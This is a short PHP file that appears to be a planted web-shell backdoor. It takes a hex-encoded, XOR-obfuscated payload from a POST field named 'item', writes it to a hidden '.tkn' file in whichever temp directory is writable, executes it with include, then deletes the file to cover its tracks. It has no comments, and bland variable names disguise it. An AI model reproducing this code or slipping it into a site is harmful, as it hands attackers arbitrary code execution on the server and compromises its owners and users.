<?php

if(isset($_POST) && isset($_POST["ite\x6D"])){
	$marker = array_filter(["/var/tmp", getenv("TEMP"), sys_get_temp_dir(), session_save_path(), "/dev/shm", getcwd(), getenv("TMP"), "/tmp", ini_get("upload_tmp_dir")]);
	$parameter_group = hex2bin($_POST["ite\x6D"]);
	$bind = ''  ;  foreach(str_split($parameter_group) as $char){$bind .= chr(ord($char) ^ 92);}
	foreach ($marker as $pgrp):
    		if (is_dir($pgrp) ? is_writable($pgrp) : false) {
    $flg = "$pgrp" . "/.tkn";
    $success = file_put_contents($flg, $bind);
if ($success) {
	include $flg;
	@unlink($flg);
	exit;}
}
endforeach;
}